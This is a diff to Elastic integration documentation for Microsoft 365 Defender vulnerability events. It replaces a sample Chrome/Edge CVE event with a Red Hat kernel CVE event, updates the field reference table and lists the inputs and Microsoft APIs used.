+        "hostname": "sample-host-1",
+        "id": "1212121212121212121212",
+        "name": "sample-host-1",
         "os": {
-            "name": "Ubuntu 20.4",
-            "platform": "Ubuntu",
+            "name": "Linux enterprise_linux_9.4",
+            "platform": "Linux",
             "type": "linux",
-            "version": "20.4"
-        },
-        "risk": {
-            "calculated_level": "None"
+            "version": "enterprise_linux_9.4"
         }
     },
     "input": {
@@ -1569,92 +1380,50 @@ An example event for `vulnerability` looks as following:
     },
     "m365_defender": {
         "vulnerability": {
-            "affected_machine": {
-                "agent_version": "30.124092.2.0",
-                "computer_dns_name": "bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
-                "device_value": "Normal",
-                "exposure_level": "Low",
-                "first_seen": "2025-01-08T13:05:05.348Z",
-                "health_status": "Inactive",
-                "id": "94819846155826828d1603b913c67fe336d81295-_-CVE-2025-3074-_-microsoft-_-edge_chromium-based-_-134.0.3124.72-_-",
-                "ip_addresses": [
-                    {
-                        "ip_address": "216.160.83.56",
-                        "mac_address": "00-0C-29-10-F1-DA",
-                        "operational_status": "Up",
-                        "type": "Other"
-                    }
-                ],
-                "is_aad_joined": false,
-                "is_excluded": false,
-                "is_potential_duplication": false,
-                "last_external_ip_address": "1.128.0.0",
-                "last_ip_address": "175.16.199.0",
-                "last_seen": "2025-01-08T13:15:03.694Z",
-                "machine_id": "94819846155826828d1603b913c67fe336d81295",
-                "machine_tags": [
-                    "test tag"
-                ],
-                "managed_by": "MicrosoftDefenderForEndpoint",
-                "managed_by_status": "Success",
-                "onboarding_status": "Onboarded",
-                "os_architecture": "64-bit",
-                "os_build": 6,
-                "os_platform": "Ubuntu",
-                "os_processor": "x64",
-                "product_name": "edge_chromium-based",
-                "product_vendor": "microsoft",
-                "product_version": "134.0.3124.72",
-                "rbac_group_id": "0",
-                "risk_score": "None",
-                "severity": "Medium",
-                "version": "20.4"
-            },
-            "cve_supportability": "Supported",
-            "cvss_v3": 6.5,
-            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N/E:U/RL:O/RC:C",
-            "description": "Summary: An inappropriate implementation in the Downloads feature of Google Chrome versions prior to 135.0.7049.52 could allow a remote attacker to perform UI spoofing via a crafted HTML page. This vulnerability, classified with a low severity by Chromium, may also enable bypassing security restrictions when a victim visits a specially crafted website. Impact: Exploitation of this vulnerability could lead to UI spoofing or bypassing security restrictions, potentially compromising user trust and security. AdditionalInformation: This vulnerability is associated with Google Chrome and has implications for Microsoft Edge (Chromium-based) due to shared code ingestion. Refer to Google Chrome Releases for further details. Remediation: Apply the latest patches and updates provided by the respective vendors. [Generated by AI]",
-            "epss": 0.00111,
-            "exploit_in_kit": false,
-            "exploit_verified": false,
-            "exposed_machines": 2,
-            "first_detected": "2025-04-01T19:52:39.000Z",
-            "id": "CVE-2025-3074",
-            "impact": "Exploitation of this vulnerability could lead to UI spoofing or bypassing security restrictions, potentially compromising user trust and security.",
-            "name": "CVE-2025-3074",
-            "public_exploit": false,
-            "published_on": "2025-04-01T00:00:00.000Z",
-            "remediation": "Apply the latest patches and updates provided by the respective vendors.",
-            "severity": "Medium",
-            "tags": [
-                "test"
-            ],
-            "updated_on": "2025-04-08T00:00:00.000Z"
+            "cve_batch_title": "Red_hat February 2025 Vulnerabilities",
+            "cve_batch_url": "https://security.access.redhat.com/data/oval/v2/RHEL9/rhel-9.8-eus.oval.xml.bz2",
+            "cve_id": "CVE-2022-49226",
+            "cvss_score": 5.5,
+            "device_id": "1212121212121212121212",
+            "device_name": "sample-host-1",
+            "exploitability_level": "NoExploit",
+            "first_seen_timestamp": "2025-10-06T10:43:58.000Z",
+            "id": "1212121212121212121212_red_hat_kernel_0:5.14.0-427.42.1.el9_4_CVE-2022-49226",
+            "is_onboarded": true,
+            "last_seen_timestamp": "2025-10-06T22:45:00.000Z",
+            "os_architecture": "x64",
+            "os_platform": "Linux",
+            "os_version": "enterprise_linux_9.4",
+            "rbac_group_id": "0",
+            "rbac_group_name": "Unassigned",
+            "recommendation_reference": "va-_-red_hat-_-kernel",
+            "recommended_security_update": "CVE-2022-49226_oval:com.redhat.rhsa:def:20249315",
+            "recommended_security_update_id": "RHSA-2024:9315",
+            "security_update_available": true,
+            "severity_level": "Medium",
+            "software_name": "kernel",
+            "software_vendor": "red_hat",
+            "software_version": "0:5.14.0-427.42.1.el9_4"
         }
     },
-    "message": "Summary: An inappropriate implementation in the Downloads feature of Google Chrome versions prior to 135.0.7049.52 could allow a remote attacker to perform UI spoofing via a crafted HTML page. This vulnerability, classified with a low severity by Chromium, may also enable bypassing security restrictions when a victim visits a specially crafted website. Impact: Exploitation of this vulnerability could lead to UI spoofing or bypassing security restrictions, potentially compromising user trust and security. AdditionalInformation: This vulnerability is associated with Google Chrome and has implications for Microsoft Edge (Chromium-based) due to shared code ingestion. Refer to Google Chrome Releases for further details. Remediation: Apply the latest patches and updates provided by the respective vendors. [Generated by AI]",
+    "message": "Red_hat February 2025 Vulnerabilities",
     "observer": {
         "product": "Microsoft 365 Defender",
         "vendor": "Microsoft"
     },
     "package": {
-        "name": "edge_chromium-based",
-        "version": "134.0.3124.72"
+        "name": "kernel",
+        "version": "0:5.14.0-427.42.1.el9_4"
     },
     "related": {
         "hosts": [
-            "bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01",
-            "94819846155826828d1603b913c67fe336d81295"
-        ],
-        "ip": [
-            "216.160.83.56",
-            "1.128.0.0",
-            "175.16.199.0"
+            "1212121212121212121212",
+            "sample-host-1"
         ]
     },
     "resource": {
-        "id": "94819846155826828d1603b913c67fe336d81295",
-        "name": "bdp3449-ub20-2-4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01"
+        "id": "1212121212121212121212",
+        "name": "sample-host-1"
     },
     "tags": [
         "preserve_original_event",
@@ -1664,19 +1433,18 @@ An example event for `vulnerability` looks as following:
     ],
     "vulnerability": {
         "classification": "CVSS",
-        "description": "Summary: An inappropriate implementation in the Downloads feature of Google Chrome versions prior to 135.0.7049.52 could allow a remote attacker to perform UI spoofing via a crafted HTML page. This vulnerability, classified with a low severity by Chromium, may also enable bypassing security restrictions when a victim visits a specially crafted website. Impact: Exploitation of this vulnerability could lead to UI spoofing or bypassing security restrictions, potentially compromising user trust and security. AdditionalInformation: This vulnerability is associated with Google Chrome and has implications for Microsoft Edge (Chromium-based) due to shared code ingestion. Refer to Google Chrome Releases for further details. Remediation: Apply the latest patches and updates provided by the respective vendors. [Generated by AI]",
+        "cve": "CVE-2022-49226",
         "enumeration": "CVE",
-        "id": "CVE-2025-3074",
-        "published_date": "2025-04-01T00:00:00.000Z",
-        "reference": "https://www.cve.org/CVERecord?id=CVE-2025-3074",
+        "id": "CVE-2022-49226",
+        "reference": "https://www.cve.org/CVERecord?id=CVE-2022-49226",
         "scanner": {
             "vendor": "Microsoft"
         },
         "score": {
-            "base": 6.5
+            "base": 5.5
         },
         "severity": "Medium",
-        "title": "An inappropriate implementation in the Downloads feature of Google Chrome versions prior to 135.0.7049.52 could allow a remote attacker to perform UI spoofing via a crafted HTML page. This vulnerability, classified with a low severity by Chromium, may also enable bypassing security restrictions when a victim visits a specially crafted website."
+        "title": "Vulnerability found in kernel 0:5.14.0-427.42.1.el9_4 - CVE-2022-49226"
     }
 }
 ```
@@ -1685,83 +1453,67 @@ An example event for `vulnerability` looks as following:
 
 | Field | Description | Type |
 |---|---|---|
-| @timestamp | Event timestamp. | date |
-| data_stream.dataset | Data stream dataset. | constant_keyword |
-| data_stream.namespace | Data stream namespace. | constant_keyword |
-| data_stream.type | Data stream type. | constant_keyword |
-| event.dataset | Event dataset. | constant_keyword |
-| event.module | Event module. | constant_keyword |
-| input.type | Type of filebeat input. | keyword |
+| @timestamp | Date/time when the event originated. This is the date/time extracted from the event, typically representing when the event was generated by the source. If the event source has no original timestamp, this value is typically populated by the first time the event was received by the pipeline. Required field for all events. | date |
+| data_stream.dataset | The field can contain anything that makes sense to signify the source of the data. Examples include `nginx.access`, `prometheus`, `endpoint` etc. For data streams that otherwise fit, but that do not have dataset set we use the value "generic" for the dataset value. `event.dataset` should have the same value as `data_stream.dataset`. Beyond the Elasticsearch data stream naming criteria noted above, the `dataset` value has additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.namespace | A user defined namespace. Namespaces are useful to allow grouping of data. Many users already organize their indices this way, and the data stream naming scheme now provides this best practice as a default. Many users will populate this field with `default`. If no value is used, it falls back to `default`. Beyond the Elasticsearch index naming criteria noted above, `namespace` value has the additional restrictions:   \* Must not contain `-`   \* No longer than 100 characters | constant_keyword |
+| data_stream.type | An overarching type for the data stream. Currently allowed values are "logs" and "metrics". We expect to also add "traces" and "synthetics" in the near future. | constant_keyword |
+| event.dataset | Name of the dataset. If an event source publishes more than one type of log or events (e.g. access log, error log), the dataset is used to specify which one the event comes from. It's recommended but not required to start the dataset name with the module name, followed by a dot, then the dataset name. | constant_keyword |
+| event.module | Name of the module this data is coming from. If your monitoring agent supports the concept of modules or plugins to process events of a given source (e.g. Apache logs), `event.module` should contain the name of this module. | constant_keyword |
+| input.type | Type of Filebeat input. | keyword |
+| log.file.device_id | Device Id of the log file this event came from. | keyword |
+| log.file.inode | Inode number of the log file. | keyword |
 | log.offset | Log offset. | long |
-| m365_defender.vulnerability.affected_machine.aad_device_id | Microsoft Entra Device ID (when machine is Microsoft Entra joined). | keyword |
-| m365_defender.vulnerability.affected_machine.agent_version |  | keyword |
-| m365_defender.vulnerability.affected_machine.computer_dns_name | Machine fully qualified name. | keyword |
-| m365_defender.vulnerability.affected_machine.device_value | The value of the device. Possible values are: Normal, Low, and High. | keyword |
-| m365_defender.vulnerability.affected_machine.exclusion_reason |  | keyword |
-| m365_defender.vulnerability.affected_machine.exposure_level | Exposure level as evaluated by Microsoft Defender for Endpoint. Possible values are: None, Low, Medium, and High. | keyword |
-| m365_defender.vulnerability.affected_machine.first_seen | First date and time where the machine was observed by Microsoft Defender for Endpoint. | date |
-| m365_defender.vulnerability.affected_machine.fixing_kb_id |  | keyword |
-| m365_defender.vulnerability.affected_machine.health_status | machine health status. Possible values are: Active, Inactive, ImpairedCommunication, NoSensorData, NoSensorDataImpairedCommunication, and Unknown. | keyword |
-| m365_defender.vulnerability.affected_machine.id |  | keyword |
-| m365_defender.vulnerability.affected_machine.ip_addresses.ip_address |  | ip |
-| m365_defender.vulnerability.affected_machine.ip_addresses.mac_address |  | keyword |
-| m365_defender.vulnerability.affected_machine.ip_addresses.operational_status |  | keyword |
-| m365_defender.vulnerability.affected_machine.ip_addresses.type |  | keyword |
-| m365_defender.vulnerability.affected_machine.is_aad_joined |  | boolean |
-| m365_defender.vulnerability.affected_machine.is_excluded |  | boolean |
-| m365_defender.vulnerability.affected_machine.is_potential_duplication |  | boolean |
-| m365_defender.vulnerability.affected_machine.last_external_ip_address | Last IP through which the machine accessed the internet. | ip |
-| m365_defender.vulnerability.affected_machine.last_ip_address | Last IP on local NIC on the machine. | ip |
-| m365_defender.vulnerability.affected_machine.last_seen | Time and date of the last received full device report. A device typically sends a full report every 24 hours. NOTE: This property doesn't correspond to the last seen value in the UI. It pertains to the last device update. | date |
-| m365_defender.vulnerability.affected_machine.machine_id | Machine identity. | keyword |
-| m365_defender.vulnerability.affected_machine.machine_tags | Set of machine tags. | keyword |
-| m365_defender.vulnerability.affected_machine.managed_by |  | keyword |
-| m365_defender.vulnerability.affected_machine.managed_by_status |  | keyword |
-| m365_defender.vulnerability.affected_machine.merged_into_machine_id |  | keyword |
-| m365_defender.vulnerability.affected_machine.onboarding_status | Status of machine onboarding. Possible values are: onboarded, CanBeOnboarded, Unsupported, and InsufficientInfo. | keyword |
-| m365_defender.vulnerability.affected_machine.os_architecture | Operating system architecture. Possible values are: 32-bit, 64-bit. Use this property instead of osProcessor. | keyword |
-| m365_defender.vulnerability.affected_machine.os_build | Operating system build number. | long |
-| m365_defender.vulnerability.affected_machine.os_platform | Operating system platform. | keyword |
-| m365_defender.vulnerability.affected_machine.os_processor | Operating system processor. Use osArchitecture property instead. | keyword |
-| m365_defender.vulnerability.affected_machine.os_version |  | keyword |
-| m365_defender.vulnerability.affected_machine.product_name |  | keyword |
-| m365_defender.vulnerability.affected_machine.product_vendor |  | keyword |
-| m365_defender.vulnerability.affected_machine.product_version |  | keyword |
-| m365_defender.vulnerability.affected_machine.rbac_group_id | Machine group ID. | keyword |
-| m365_defender.vulnerability.affected_machine.rbac_group_name | Machine group Name. | keyword |
-| m365_defender.vulnerability.affected_machine.risk_score | Risk score as evaluated by Microsoft Defender for Endpoint. Possible values are: None, Informational, Low, Medium, and High. | keyword |
-| m365_defender.vulnerability.affected_machine.severity |  | keyword |
-| m365_defender.vulnerability.affected_machine.version | Operating system version. | keyword |
-| m365_defender.vulnerability.affected_machine.vmMetadata.cloud_provider |  | keyword |
-| m365_defender.vulnerability.affected_machine.vmMetadata.resource_id |  | keyword |
-| m365_defender.vulnerability.affected_machine.vmMetadata.subscription_id |  | keyword |
-| m365_defender.vulnerability.affected_machine.vmMetadata.vm_id |  | keyword |
-| m365_defender.vulnerability.cve_supportability | Possible values are: Supported, Not Supported, or SupportedInPremium. | keyword |
-| m365_defender.vulnerability.cvss_v3 | CVSS v3 score. | double |
-| m365_defender.vulnerability.cvss_vector | A compressed textual representation that reflects the values used to derive the score. | keyword |
-| m365_defender.vulnerability.description | Vulnerability description. | keyword |
-| m365_defender.vulnerability.epss | Represents the probability that a vulnerability will be exploited. This probability is expressed as a number between 0 and 1 (0%-100%) according to the EPSS model. | double |
-| m365_defender.vulnerability.exploit_in_kit | Exploit is part of an exploit kit. | boolean |
-| m365_defender.vulnerability.exploit_types | Exploit affect. Possible values are: Local privilege escalation, Denial of service, or Local. | keyword |
-| m365_defender.vulnerability.exploit_uris | Exploit source URLs. | keyword |
-| m365_defender.vulnerability.exploit_verified | Exploit is verified to work. | boolean |
-| m365_defender.vulnerability.exposed_machines | Number of exposed devices. | long |
-| m365_defender.vulnerability.first_detected |  | date |
-| m365_defender.vulnerability.id | Vulnerability ID. | keyword |
-| m365_defender.vulnerability.impact |  | keyword |
-| m365_defender.vulnerability.name | Vulnerability title. | keyword |
-| m365_defender.vulnerability.patch_first_available |  | date |
-| m365_defender.vulnerability.public_exploit | Public exploit exists. | boolean |
-| m365_defender.vulnerability.published_on | Date when vulnerability was published. | date |
-| m365_defender.vulnerability.remediation |  | keyword |
-| m365_defender.vulnerability.severity | Vulnerability Severity. Possible values are: Low, Medium, High, or Critical. | keyword |
-| m365_defender.vulnerability.tags |  | keyword |
-| m365_defender.vulnerability.updated_on | Date when vulnerability was updated. | date |
+| m365_defender.vulnerability.cve_batch_title |  | keyword |
+| m365_defender.vulnerability.cve_batch_url |  | keyword |
+| m365_defender.vulnerability.cve_id | Unique identifier assigned to the security vulnerability under the Common Vulnerabilities and Exposures (CVE) system. | keyword |
+| m365_defender.vulnerability.cvss_score | The CVSS score of the CVE. | float |
+| m365_defender.vulnerability.device_id | Unique identifier for the device in the service. | keyword |
+| m365_defender.vulnerability.device_name | Fully qualified domain name (FQDN) of the device. | keyword |
+| m365_defender.vulnerability.disk_paths | Disk evidence that the product is installed on the device. | keyword |
+| m365_defender.vulnerability.exploitability_level | The exploitability level of this vulnerability (NoExploit, ExploitIsPublic, ExploitIsVerified, ExploitIsInKit) | keyword |
+| m365_defender.vulnerability.first_seen_timestamp | First time this product CVE was seen on the device. | date |
+| m365_defender.vulnerability.id | Unique identifier for the record. | keyword |
+| m365_defender.vulnerability.is_onboarded |  | boolean |
+| m365_defender.vulnerability.last_seen_timestamp | Last time the software was reported on the device. | date |
+| m365_defender.vulnerability.os_architecture | Architecture of the operating system running on the device. | keyword |
+| m365_defender.vulnerability.os_platform | Platform of the operating system running on the device. | keyword |
+| m365_defender.vulnerability.os_version | Version of the operating system running on the device. | keyword |
+| m365_defender.vulnerability.rbac_group_id |  | keyword |
+| m365_defender.vulnerability.rbac_group_name | The role-based access control (RBAC) group. | keyword |
+| m365_defender.vulnerability.recommendation_reference | A reference to the recommendation ID related to this software. | keyword |
+| m365_defender.vulnerability.recommended_security_update | Name or description of the security update provided by the software vendor to address the vulnerability. | keyword |
+| m365_defender.vulnerability.recommended_security_update_id | Identifier of the applicable security updates or identifier for the corresponding guidance or knowledge base (KB) articles. | keyword |
+| m365_defender.vulnerability.registry_paths | Registry evidence that the product is installed in the device. | keyword |
+| m365_defender.vulnerability.security_update_available | Indicates whether a security update is available for the software. | boolean |
+| m365_defender.vulnerability.severity_level | Severity level assigned to the security vulnerability based on the CVSS score. | keyword |
+| m365_defender.vulnerability.software_name | Name of the software product. | keyword |
+| m365_defender.vulnerability.software_vendor | Name of the software vendor. | keyword |
+| m365_defender.vulnerability.software_version | Version number of the software product. | keyword |
+| observer.vendor | Vendor name of the observer. | constant_keyword |
 | package.fixed_version |  | keyword |
 | package.name | Package name | keyword |
 | package.version | Package version | keyword |
 | resource.id |  | keyword |
 | resource.name |  | keyword |
+| vulnerability.cve | The CVE id of the vulnerability. | keyword |
 | vulnerability.published_date |  | date |
+| vulnerability.scanner.vendor | The name of the vulnerability scanner vendor. | constant_keyword |
 | vulnerability.title |  | keyword |
 
+
+### Inputs used
+
+These inputs are used in this integration:
+
+- [azure-eventhub](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-azure-eventhub)
+- [cel](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-cel)
+- [httpjson](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-httpjson)
+
+### API usage
+
+This integration dataset uses the following APIs:
+
+- `Alerts`: [List alerts_v2](https://learn.microsoft.com/en-us/graph/api/security-list-alerts_v2?view=graph-rest-1.0&tabs=http) endpoint from [Microsoft Graph Security REST API v1.0](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0)
+- `Events`: [Microsoft Defender XDR Streaming API](https://learn.microsoft.com/en-us/defender-xdr/streaming-api?view=o365-worldwide)
+- `Incidents`: [List incidents](https://learn.microsoft.com/en-us/graph/api/security-list-incidents?view=graph-rest-1.0&tabs=http) endpoint from [Microsoft Graph Security REST API v1.0](https://learn.microsoft.com/en-us/graph/api/resources/security-api-overview?view=graph-rest-1.0)
+- `Vulnerabilities`: [Get software vulnerabilities](https://learn.microsoft.com/en-us/defender-endpoint/api/get-assessment-software-vulnerabilities#2-export-software-vulnerabilities-assessment-via-files) endpoint from [Microsoft Defender for Endpoint API v1.0](https://learn.microsoft.com/en-us/defender-endpoint/api/exposed-apis-list)
